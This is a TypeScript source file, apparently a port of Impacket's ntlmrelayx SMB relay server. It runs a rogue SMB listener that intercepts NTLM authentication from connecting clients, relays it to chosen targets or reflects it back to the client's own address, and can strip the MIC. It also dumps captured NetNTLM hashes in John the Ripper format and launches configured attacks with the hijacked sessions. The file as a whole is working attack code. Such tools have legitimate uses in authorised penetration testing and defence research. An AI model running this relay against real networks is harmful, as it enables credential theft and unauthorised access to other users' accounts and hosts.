import { info, error as logError, debug } from '@impacket/examples';
import {
  SMBSERVER,
  outputToJohnFormat,
  writeJohnOutputToFile,
} from '@impacket/smb-server';
import * as smb from '@impacket/smb';
import * as smb3 from '@impacket/smb3';
import * as ntlmMod from '@impacket/ntlm';
import * as spnegoMod from '@impacket/spnego';
import {
  STATUS_SUCCESS,
  STATUS_MORE_PROCESSING_REQUIRED,
  STATUS_ACCESS_DENIED,
  STATUS_BAD_NETWORK_NAME,
} from '@impacket/nt-errors';
import type { NTLMRelayxConfig, ProtocolClientInstance } from './config.js';
import { TargetsProcessor } from './targets.js';
import { SMBRelayClient } from './smbRelayClient.js';

const STATUS_NETWORK_SESSION_EXPIRED = 0xC000035C;

function encodeSMBString(flags: number, s: string): Buffer {
  if (flags & smb.FLAGS2_UNICODE) {
    return Buffer.from(s + '\x00', 'utf16le');
  }
  return Buffer.from(s + '\x00', 'ascii');
}

export class SMBRelayServer {
  private server: SMBSERVER;
  private config: NTLMRelayxConfig;
  private target: URL | null = null;
  private targetprocessor: TargetsProcessor;
  private authUser: string | null = null;

  private origSmbComNegotiate: any;
  private origSmbSessionSetupAndX: any;
  private origsmbComTreeConnectAndX: any;
  private origSmbNegotiate: any;
  private origSmbSessionSetup: any;
  private origsmb2TreeConnect: any;

  constructor(config: NTLMRelayxConfig) {
    this.config = config;
    this.targetprocessor = config.target!;

    const ConfigParser = (SMBSERVER as any).__ConfigParser;
    const smbConfig = ConfigParser
      ? new ConfigParser()
      : (() => {
          const srv = new SMBSERVER('0.0.0.0', 445);
          return srv.getServerConfig();
        })();

    const port = config.listeningPort ?? 445;

    this.server = new SMBSERVER(config.interfaceIp ?? '0.0.0.0', port);

    const serverConfig = this.server.getServerConfig();
    serverConfig.addSection('global');
    serverConfig.set('global', 'server_name', 'server_name');
    serverConfig.set('global', 'server_os', 'UNIX');
    serverConfig.set('global', 'server_domain', 'WORKGROUP');
    serverConfig.set('global', 'log_file', 'None');
    serverConfig.set('global', 'credentials_file', '');
    serverConfig.set('global', 'SMB2Support', config.smb2support ? 'True' : 'False');
    serverConfig.set('global', 'anonymous_logon', 'False');
    serverConfig.set('global', 'dump_hashes', config.dumpHashes ? 'True' : 'False');

    if (config.outputFile) {
      serverConfig.set('global', 'jtr_dump_path', config.outputFile);
    }
    if (config.SMBServerChallenge) {
      serverConfig.set('global', 'challenge', config.SMBServerChallenge);
    }

    serverConfig.addSection('IPC$');
    serverConfig.set('IPC$', 'comment', '');
    serverConfig.set('IPC$', 'read only', 'yes');
    serverConfig.set('IPC$', 'share type', '3');
    serverConfig.set('IPC$', 'path', '');

    this.server.processConfigFile();

    if (!config.disableMulti) {
      this.server.setAuthCallback((_srv, connData) => {
        const user = (connData as any).AUTHENTICATE_MESSAGE
          ? (connData as any).AUTHENTICATE_MESSAGE.getUserString?.() ?? 'unknown'
          : 'unknown';
        info(`(SMB): Received connection from ${user}, connection will be relayed after re-authentication`);
      });
    }

    this.origSmbComNegotiate = this.server.hookSmbCommand(
      smb.SMB_COMMAND_NEGOTIATE,
      (connId: string, smbServer: SMBSERVER, cmd: any, pkt: any) =>
        this.smbComNegotiate(connId, smbServer, cmd, pkt),
    );
    this.origSmbSessionSetupAndX = this.server.hookSmbCommand(
      smb.SMB_COMMAND_SESSION_SETUP,
      (connId: string, smbServer: SMBSERVER, cmd: any, pkt: any) =>
        this.smbSessionSetupAndX(connId, smbServer, cmd, pkt),
    );
    this.origsmbComTreeConnectAndX = this.server.hookSmbCommand(
      smb.SMB_COMMAND_TREE_CONNECT_ANDX,
      (connId: string, smbServer: SMBSERVER, cmd: any, pkt: any) =>
        this.smbComTreeConnectAndX(connId, smbServer, cmd, pkt),
    );

    this.origSmbNegotiate = this.server.hookSmb2Command(
      smb3.SMB2_NEGOTIATE,
      (connId: string, smbServer: SMBSERVER, pkt: any) =>
        this.smb2Negotiate(connId, smbServer, pkt),
    );
    this.origSmbSessionSetup = this.server.hookSmb2Command(
      smb3.SMB2_SESSION_SETUP,
      (connId: string, smbServer: SMBSERVER, pkt: any) =>
        this.smb2SessionSetup(connId, smbServer, pkt),
    );
    this.origsmb2TreeConnect = this.server.hookSmb2Command(
      smb3.SMB2_TREE_CONNECT,
      (connId: string, smbServer: SMBSERVER, pkt: any) =>
        this.smb2TreeConnect(connId, smbServer, pkt),
    );

    this.server.addConnection('SMBRelay', config.interfaceIp ?? '0.0.0.0', port);
  }

  // ── SMBv2 ──────────────────────────────────────────────────────────

  private smb2Negotiate(connId: string, smbServer: SMBSERVER, recvPacket: any, isSMB1 = false): any {
    const connData = smbServer.getConnectionData(connId, false) as any;

    if (this.config.disableMulti) {
      if (this.config.mode === 'REFLECTION') {
        this.targetprocessor = new TargetsProcessor({ singleTarget: `SMB://${connData.ClientIP}:445/` });
      }
      this.target = this.targetprocessor.getTarget(null, false);
      if (!this.target) {
        if (this.config.keepRelaying) {
          this.config.target!.reloadTargets(true);
          this.target = this.targetprocessor.getTarget(null, false);
        }
        if (!this.target) {
          info(`(SMB): Connection from ${connData.ClientIP} controlled, but there are no more targets left!`);
          return [null, null, STATUS_BAD_NETWORK_NAME];
        }
      }
      info(`(SMB): Received connection from ${connData.ClientIP}, attacking target ${this.target.protocol}//${this.target.host}`);
      this.initClientAsync(connId, smbServer, connData);
    }

    return this.origSmbNegotiate(connId, smbServer, recvPacket, isSMB1);
  }

  private async smb2SessionSetup(connId: string, smbServer: SMBSERVER, recvPacket: any): Promise<any> {
    const connData = smbServer.getConnectionData(connId, false) as any;

    if (!this.config.disableMulti && (!connData.relayToHost)) {
      const [cmds, pkts, code] = this.origSmbSessionSetup(connId, smbServer, recvPacket);
      if (cmds && cmds[0] && 'SessionFlags' in (cmds[0].fields ?? {})) {
        cmds[0].set('SessionFlags', 0x00);
      }
      return [cmds, pkts, code];
    }

    const respSMBCommand = new smb3.SMB2SessionSetup_Response();
    const sessionSetupData = new smb3.SMB2SessionSetup();
    sessionSetupData.fromString(recvPacket.get('Data') as Buffer);

    connData.Capabilities = sessionSetupData.get('Capabilities');
    const securityBlob = sessionSetupData.get('Buffer') as Buffer;

    let rawNTLM = false;
    let token: Buffer;

    if (securityBlob[0] === spnegoMod.ASN1_AID) {
      const blob = new spnegoMod.SPNEGO_NegTokenInit();
      blob.fromString(securityBlob);
      token = blob.fields['MechToken'] as Buffer || Buffer.alloc(0);
      const mechType = blob.fields['MechTypes']?.[0] as any;
      if (mechType && mechType !== (spnegoMod.TypesMech as any)['NTLMSSP']) {
        const respToken = new spnegoMod.SPNEGO_NegTokenResp();
        respToken.fields['NegState'] = Buffer.from([0x03]);
        respToken.fields['SupportedMech'] = spnegoMod.TypesMech['NTLMSSP']!;
        const tokenData = respToken.getData();
        respSMBCommand.set('SecurityBufferOffset', 0x48);
        respSMBCommand.set('SecurityBufferLength', tokenData.length);
        respSMBCommand.set('Buffer', tokenData);
        return [[respSMBCommand], null, STATUS_MORE_PROCESSING_REQUIRED];
      }
    } else if (securityBlob[0] === spnegoMod.ASN1_SUPPORTED_MECH) {
      const blob = new spnegoMod.SPNEGO_NegTokenResp();
      blob.fromString(securityBlob);
      token = blob.fields['ResponseToken'] as Buffer || Buffer.alloc(0);
    } else {
      rawNTLM = true;
      token = securityBlob;
    }

    if (token.length < 12) {
      return [[respSMBCommand], null, STATUS_ACCESS_DENIED];
    }

    const messageType = token.readUInt32LE(8);
    let errorCode = STATUS_SUCCESS;

    if (messageType === 0x01) {
      // NEGOTIATE_MESSAGE — forward to target
      const negotiateMessage = new ntlmMod.NTLMAuthNegotiate();
      negotiateMessage.fromString(token);
      connData.NEGOTIATE_MESSAGE = negotiateMessage;

      const client: ProtocolClientInstance | undefined = connData.SMBClient;
      if (!client) {
        logError(`(SMB): No relay client initialized for target ${this.target?.protocol}//${this.target?.host}`);
        respSMBCommand.set('SecurityBufferOffset', 0x48);
        respSMBCommand.set('SecurityBufferLength', 0);
        respSMBCommand.set('Buffer', Buffer.alloc(0));
        smbServer.setConnectionData(connId, connData);
        return [[respSMBCommand], null, STATUS_ACCESS_DENIED];
      }

      let challengeMessage: any;
      try {
        challengeMessage = client.sendNegotiate(token);
        if (challengeMessage instanceof Promise) challengeMessage = null;
      } catch (e) {
        logError(`(SMB): NTLM negotiate failed: ${e}`);
        this.targetprocessor.registerTarget(this.target!, false, this.authUser);
        return [[respSMBCommand], null, STATUS_ACCESS_DENIED];
      }

      if (!challengeMessage) {
        logError('(SMB): No challenge message returned from target');
        return [[respSMBCommand], null, STATUS_ACCESS_DENIED];
      }

      let respToken: Buffer;
      if (rawNTLM) {
        respToken = challengeMessage.getData();
      } else {
        const negResp = new spnegoMod.SPNEGO_NegTokenResp();
        negResp.fields['NegState'] = Buffer.from([0x01]);
        negResp.fields['SupportedMech'] = spnegoMod.TypesMech['NTLMSSP']!;
        negResp.fields['ResponseToken'] = challengeMessage.getData();
        respToken = negResp.getData();
      }

      errorCode = STATUS_MORE_PROCESSING_REQUIRED;
      connData.Uid = Math.floor(Math.random() * 0xffffffff) + 1;
      connData.CHALLENGE_MESSAGE = challengeMessage;

      respSMBCommand.set('SecurityBufferOffset', 0x48);
      respSMBCommand.set('SecurityBufferLength', respToken.length);
      respSMBCommand.set('Buffer', respToken);

    } else if (messageType === 0x03) {
      // AUTHENTICATE_MESSAGE — forward to target
      const client: ProtocolClientInstance = connData.SMBClient;
      const authenticateMessage = new ntlmMod.NTLMAuthChallengeResponse();
      authenticateMessage.fromString(token);
      this.authUser = authenticateMessage.getUserString?.() ?? 'unknown';

      let authBlob = securityBlob;
      if (rawNTLM) {
        const wrapped = new spnegoMod.SPNEGO_NegTokenResp();
        wrapped.fields['ResponseToken'] = securityBlob;
        authBlob = wrapped.getData();
      }

      let sendData: Buffer;
      if (this.config.remove_mic) {
        sendData = token;
      } else {
        sendData = authBlob;
      }

      let clientResponse: any;
      try {
        [clientResponse, errorCode] = await client.sendAuth(
          sendData,
          connData.CHALLENGE_MESSAGE?.get?.('challenge') as Buffer,
        );
      } catch (e) {
        logError(`(SMB): Auth relay failed: ${e}`);
        errorCode = STATUS_ACCESS_DENIED;
      }

      if (errorCode !== STATUS_SUCCESS) {
        logError(`(SMB): Authenticating against ${this.target?.protocol}//${this.target?.host} as ${this.authUser} FAILED`);
        this.targetprocessor.registerTarget(this.target!, false, this.authUser);
        client.killConnection();
      } else {
        client.setClientId();
        info(`(SMB): Authenticating against ${this.target?.protocol}//${this.target?.host} as ${this.authUser} SUCCEED [${client.client_id}]`);

        if (!this.config.isADCSAttack) {
          this.targetprocessor.registerTarget(this.target!, true, this.authUser);
        }

        const ntlmHashData = outputToJohnFormat(
          connData.CHALLENGE_MESSAGE?.get?.('challenge') ?? Buffer.alloc(8),
          authenticateMessage.get('user_name') as Buffer,
          authenticateMessage.get('domain_name') as Buffer,
          authenticateMessage.get('lanman') as Buffer,
          authenticateMessage.get('ntlm') as Buffer,
        );
        client.sessionData['JOHN_OUTPUT'] = ntlmHashData;

        if (this.server.getDumpHashes() && ntlmHashData) {
          info(`(SMB): ${ntlmHashData.hash_string}`);
        }

        const jtrPath = this.server.getJTRdumpPath();
        if (jtrPath && ntlmHashData) {
          writeJohnOutputToFile(ntlmHashData.hash_string, ntlmHashData.hash_version, jtrPath);
        }

        connData.Authenticated = true;
        if (!this.config.disableMulti) {
          connData.relayToHost = false;
        }

        this.doAttack(client);
      }

      let respToken: Buffer;
      if (rawNTLM) {
        respToken = Buffer.alloc(0);
      } else {
        const negResp = new spnegoMod.SPNEGO_NegTokenResp();
        negResp.fields['NegState'] = Buffer.from([errorCode === STATUS_SUCCESS ? 0x00 : 0x02]);
        respToken = negResp.getData();
      }

      connData.AUTHENTICATE_MESSAGE = authenticateMessage;
      respSMBCommand.set('SecurityBufferOffset', 0x48);
      respSMBCommand.set('SecurityBufferLength', respToken.length);
      respSMBCommand.set('Buffer', respToken);

    } else {
      throw new Error(`Unknown NTLMSSP MessageType ${messageType}`);
    }

    smbServer.setConnectionData(connId, connData);
    return [[respSMBCommand], null, errorCode];
  }

  private smb2TreeConnect(connId: string, smbServer: SMBSERVER, recvPacket: any): any {
    const connData = smbServer.getConnectionData(connId) as any;
    const authenticateMessage = connData.AUTHENTICATE_MESSAGE;
    this.authUser = authenticateMessage?.getUserString?.() ?? 'unknown';

    if (this.config.disableMulti) {
      return this.origsmb2TreeConnect(connId, smbServer, recvPacket);
    }

    try {
      if (this.config.mode === 'REFLECTION') {
        this.targetprocessor = new TargetsProcessor({ singleTarget: `SMB://${connData.ClientIP}:445/` });
      }

      this.target = this.targetprocessor.getTarget(this.authUser);
      if (!this.target) {
        if (this.config.keepRelaying) {
          this.config.target!.reloadTargets(true);
          this.target = this.targetprocessor.getTarget(null, false);
        }
        if (!this.target) {
          info(`(SMB): Connection from ${this.authUser}@${connData.ClientIP} controlled, but there are no more targets left!`);
          return this.origsmb2TreeConnect(connId, smbServer, recvPacket);
        }
      }

      info(`(SMB): Connection from ${this.authUser}@${connData.ClientIP} controlled, attacking target ${this.target.protocol}//${this.target.host}`);

      this.initClientAsync(connId, smbServer, connData);
    } catch (e) {
      logError(`(SMB): Connection against target ${this.target?.protocol}//${this.target?.host} FAILED: ${e}`);
      if (this.target) this.targetprocessor.registerTarget(this.target, false, this.authUser);
    }

    connData.relayToHost = true;
    connData.Authenticated = false;
    delete connData.NEGOTIATE_MESSAGE;
    delete connData.CHALLENGE_MESSAGE;
    delete connData.AUTHENTICATE_MESSAGE;

    const respPacket = new smb3.SMB2Packet();
    respPacket.set('Flags', smb3.SMB2_FLAGS_SERVER_TO_REDIR);
    respPacket.set('Status', STATUS_NETWORK_SESSION_EXPIRED);
    respPacket.set('CreditRequestResponse', 1);
    respPacket.set('Command', recvPacket.get('Command'));
    respPacket.set('SessionID', connData.Uid);
    respPacket.set('MessageID', recvPacket.get('MessageID'));
    respPacket.set('TreeID', recvPacket.get('TreeID'));

    const respTreeConnect = new smb3.SMB2TreeConnect_Response();
    respTreeConnect.set('Capabilities', 0);
    respTreeConnect.set('MaximalAccess', 0x000f01ff);
    respPacket.set('Data', respTreeConnect.getData());

    if (connData.SignatureEnabled) {
      smbServer.signSMBv2(respPacket, connData.SigningSessionKey);
    }

    smbServer.setConnectionData(connId, connData);
    return [null, [respPacket], STATUS_NETWORK_SESSION_EXPIRED];
  }

  // ── SMBv1 ──────────────────────────────────────────────────────────

  private smbComNegotiate(connId: string, smbServer: SMBSERVER, cmd: any, recvPacket: any): any {
    const connData = smbServer.getConnectionData(connId, false) as any;

    if (this.config.disableMulti) {
      if (this.config.mode === 'REFLECTION') {
        this.targetprocessor = new TargetsProcessor({ singleTarget: `SMB://${connData.ClientIP}:445/` });
      }
      this.target = this.targetprocessor.getTarget(null, false);
      if (!this.target) {
        if (this.config.keepRelaying) {
          this.config.target!.reloadTargets(true);
          this.target = this.targetprocessor.getTarget(null, false);
        }
        if (!this.target) {
          info(`(SMB): Connection from ${connData.ClientIP} controlled, but there are no more targets left!`);
          return [[], null, STATUS_BAD_NETWORK_NAME];
        }
      }
      info(`(SMB): Received connection from ${connData.ClientIP}, attacking target ${this.target.protocol}//${this.target.host}`);
      this.initClientAsync(connId, smbServer, connData);
    }

    return this.origSmbComNegotiate(connId, smbServer, cmd, recvPacket);
  }

  private async smbSessionSetupAndX(connId: string, smbServer: SMBSERVER, cmd: any, recvPacket: any): Promise<any> {
    const connData = smbServer.getConnectionData(connId, false) as any;

    if (!this.config.disableMulti && (!connData.relayToHost)) {
      return this.origSmbSessionSetupAndX(connId, smbServer, cmd, recvPacket);
    }

    const flags2 = recvPacket.get('Flags2') as number;
    if (!(flags2 & smb.FLAGS2_EXTENDED_SECURITY)) {
      return this.origSmbSessionSetupAndX(connId, smbServer, cmd, recvPacket);
    }

    const respSMBCommand = new smb.SMBCommand();
    respSMBCommand.command = smb.SMB_COMMAND_SESSION_SETUP;

    const sessionSetupData = new smb.SMBSessionSetupAndX_Extended_Data();
    const sessionSetupParams = new smb.SMBSessionSetupAndX_Extended_Parameters();
    sessionSetupParams.fromString(cmd.get('Parameters') as Buffer);
    (sessionSetupData as any)['SecurityBlobLength'] = sessionSetupParams.get('SecurityBlobLength');
    sessionSetupData.fromString(cmd.get('Data') as Buffer);

    connData.Capabilities = sessionSetupParams.get('Capabilities');
    const securityBlob = sessionSetupData.get('SecurityBlob') as Buffer;

    let token: Buffer;
    if (securityBlob[0] !== spnegoMod.ASN1_AID) {
      const blob = new spnegoMod.SPNEGO_NegTokenResp();
      blob.fromString(securityBlob);
      token = blob.fields['ResponseToken'] as Buffer || Buffer.alloc(0);
    } else {
      const blob = new spnegoMod.SPNEGO_NegTokenInit();
      blob.fromString(securityBlob);
      token = blob.fields['MechToken'] as Buffer || Buffer.alloc(0);
    }

    const messageType = token.readUInt32LE(8);
    let errorCode = STATUS_SUCCESS;
    let respToken: any;

    if (messageType === 0x01) {
      const negotiateMessage = new ntlmMod.NTLMAuthNegotiate();
      negotiateMessage.fromString(token);
      connData.NEGOTIATE_MESSAGE = negotiateMessage;

      const client: ProtocolClientInstance | undefined = connData.SMBClient;
      if (!client) {
        logError(`(SMB): No relay client initialized`);
        smbServer.setConnectionData(connId, connData);
        return [[], null, STATUS_ACCESS_DENIED];
      }

      let challengeMessage: any;
      try {
        challengeMessage = client.sendNegotiate(token);
        if (challengeMessage instanceof Promise) challengeMessage = null;
      } catch (e) {
        logError(`(SMB): NTLM negotiate failed: ${e}`);
        this.targetprocessor.registerTarget(this.target!, false, this.authUser);
        throw e;
      }

      if (!challengeMessage) {
        return [[], null, STATUS_ACCESS_DENIED];
      }

      respToken = new spnegoMod.SPNEGO_NegTokenResp();
      respToken.fields['NegState'] = Buffer.from([0x01]);
      respToken.fields['SupportedMech'] = spnegoMod.TypesMech['NTLMSSP']!;
      respToken.fields['ResponseToken'] = challengeMessage.getData();

      errorCode = STATUS_MORE_PROCESSING_REQUIRED;
      connData.Uid = 10;
      connData.CHALLENGE_MESSAGE = challengeMessage;

    } else if (messageType === 0x03) {
      const client: ProtocolClientInstance = connData.SMBClient;
      const authenticateMessage = new ntlmMod.NTLMAuthChallengeResponse();
      authenticateMessage.fromString(token);
      this.authUser = authenticateMessage.getUserString?.() ?? 'unknown';

      let clientResponse: any;
      try {
        [clientResponse, errorCode] = await client.sendAuth(
          securityBlob,
          connData.CHALLENGE_MESSAGE?.get?.('challenge') as Buffer,
        );
      } catch (e) {
        errorCode = STATUS_ACCESS_DENIED;
      }

      if (errorCode !== STATUS_SUCCESS) {
        logError(`(SMB): Authenticating against ${this.target?.protocol}//${this.target?.host} as ${this.authUser} FAILED`);
        this.targetprocessor.registerTarget(this.target!, false, this.authUser);
        client.killConnection();
      } else {
        client.setClientId();
        info(`(SMB): Authenticating against ${this.target?.protocol}//${this.target?.host} as ${this.authUser} SUCCEED [${client.client_id}]`);
        this.targetprocessor.registerTarget(this.target!, true, this.authUser);

        const ntlmHashData = outputToJohnFormat(
          connData.CHALLENGE_MESSAGE?.get?.('challenge') ?? Buffer.alloc(8),
          authenticateMessage.get('user_name') as Buffer,
          authenticateMessage.get('domain_name') as Buffer,
          authenticateMessage.get('lanman') as Buffer,
          authenticateMessage.get('ntlm') as Buffer,
        );
        client.sessionData['JOHN_OUTPUT'] = ntlmHashData;

        if (this.server.getDumpHashes() && ntlmHashData) {
          info(`(SMB): ${ntlmHashData.hash_string}`);
        }

        connData.Authenticated = true;
        if (!this.config.disableMulti) connData.relayToHost = false;

        this.doAttack(client);
      }

      respToken = new spnegoMod.SPNEGO_NegTokenResp();
      respToken.fields['NegState'] = Buffer.from([errorCode === STATUS_SUCCESS ? 0x00 : 0x02]);
      connData.AUTHENTICATE_MESSAGE = authenticateMessage;
    } else {
      throw new Error(`Unknown NTLMSSP MessageType ${messageType}`);
    }

    const respParams = new smb.SMBSessionSetupAndX_Extended_Response_Parameters();
    respParams.set('SecurityBlobLength', respToken.getData().length);
    const respData = new smb.SMBSessionSetupAndX_Extended_Response_Data();
    respData.set('SecurityBlob', respToken.getData());

    respSMBCommand.set('Parameters', respParams.getData());
    respSMBCommand.set('Data', respData.getData());

    smbServer.setConnectionData(connId, connData);
    return [[respSMBCommand], null, errorCode];
  }

  private smbComTreeConnectAndX(connId: string, smbServer: SMBSERVER, cmd: any, recvPacket: any): any {
    const connData = smbServer.getConnectionData(connId) as any;
    this.authUser = connData.AUTHENTICATE_MESSAGE?.getUserString?.() ?? 'unknown';

    if (this.config.disableMulti) {
      return this.origsmbComTreeConnectAndX(connId, smbServer, cmd, recvPacket);
    }

    try {
      if (this.config.mode === 'REFLECTION') {
        this.targetprocessor = new TargetsProcessor({ singleTarget: `SMB://${connData.ClientIP}:445/` });
      }
      this.target = this.targetprocessor.getTarget(this.authUser);
      if (!this.target) {
        if (this.config.keepRelaying) {
          this.config.target!.reloadTargets(true);
          this.target = this.targetprocessor.getTarget(null, false);
        }
        if (!this.target) {
          info(`(SMB): Connection from ${this.authUser}@${connData.ClientIP} controlled, but there are no more targets left!`);
          return this.origsmbComTreeConnectAndX(connId, smbServer, cmd, recvPacket);
        }
      }

      info(`(SMB): Connection from ${this.authUser}@${connData.ClientIP} controlled, attacking target ${this.target.protocol}//${this.target.host}`);
      this.initClientAsync(connId, smbServer, connData);
    } catch (e) {
      logError(`(SMB): Connection against target ${this.target?.protocol}//${this.target?.host} FAILED: ${e}`);
      if (this.target) this.targetprocessor.registerTarget(this.target, false, this.authUser);
    }

    connData.relayToHost = true;
    connData.Authenticated = false;
    delete connData.NEGOTIATE_MESSAGE;
    delete connData.CHALLENGE_MESSAGE;
    delete connData.AUTHENTICATE_MESSAGE;

    const resp = new smb.NewSMBPacket();
    resp.set('Flags1', smb.FLAGS1_REPLY);
    resp.set('Flags2',
      smb.FLAGS2_EXTENDED_SECURITY | smb.FLAGS2_NT_STATUS | smb.FLAGS2_LONG_NAMES |
      ((recvPacket.get('Flags2') as number) & smb.FLAGS2_UNICODE));
    resp.set('Tid', recvPacket.get('Tid'));
    resp.set('Mid', recvPacket.get('Mid'));
    resp.set('Uid', connData.Uid);

    resp.set('ErrorCode', STATUS_NETWORK_SESSION_EXPIRED >>> 16);
    resp.set('_reserved', 0x03);
    resp.set('ErrorClass', STATUS_NETWORK_SESSION_EXPIRED & 0xff);

    const respCmd = new smb.SMBCommand();
    respCmd.command = smb.SMB_COMMAND_TREE_CONNECT_ANDX;

    resp.addCommand(respCmd);
    smbServer.setConnectionData(connId, connData);

    return [null, [resp], STATUS_NETWORK_SESSION_EXPIRED];
  }

  // ── Helpers ────────────────────────────────────────────────────────

  private initClientAsync(connId: string, smbServer: SMBSERVER, connData: any): void {
    if (!this.target) return;

    const scheme = this.target.protocol.replace(':', '').toUpperCase();
    const ClientClass = this.config.protocolClients[scheme];

    if (!ClientClass) {
      logError(`Protocol Client for ${scheme} not found!`);
      return;
    }

    const client = new ClientClass(this.config, this.target, { extendedSecurity: true });

    client.initConnection().then((ok) => {
      if (ok) {
        connData.SMBClient = client;
        connData.EncryptionKey = client.getStandardSecurityChallenge();
        smbServer.setConnectionData(connId, connData);
      } else {
        logError(`(SMB): Connection to target ${this.target?.protocol}//${this.target?.host} FAILED`);
        if (this.target) this.targetprocessor.registerTarget(this.target, false, this.authUser);
      }
    }).catch((e) => {
      logError(`(SMB): Connection to target failed: ${e}`);
      if (this.target) this.targetprocessor.registerTarget(this.target, false, this.authUser);
    });
  }

  private doAttack(client: ProtocolClientInstance): void {
    if (!this.target) return;

    const scheme = this.target.protocol.replace(':', '').toUpperCase();
    const AttackClass = this.config.attacks[scheme];

    if (AttackClass) {
      const attack = new AttackClass(this.config, client.session, this.authUser ?? 'unknown', this.target, client);
      attack.run().catch((e: any) => {
        logError(`(SMB): Attack failed: ${e}`);
      });
    } else {
      logError(`(SMB): No attack configured for ${scheme}`);
    }
  }

  start(): Promise<void> {
    const port = this.config.listeningPort ?? 445;
    info(`Setting up SMB Server on port ${port}`);
    return new Promise<void>((resolve, reject) => {
      this.server.once('error', reject);
      this.server.once('listening', () => {
        this.server.removeListener('error', reject);
        resolve();
      });
      this.server.serveForever();
    });
  }

  stop(): void {
    this.server.close();
  }

  getServer(): SMBSERVER {
    return this.server;
  }
}
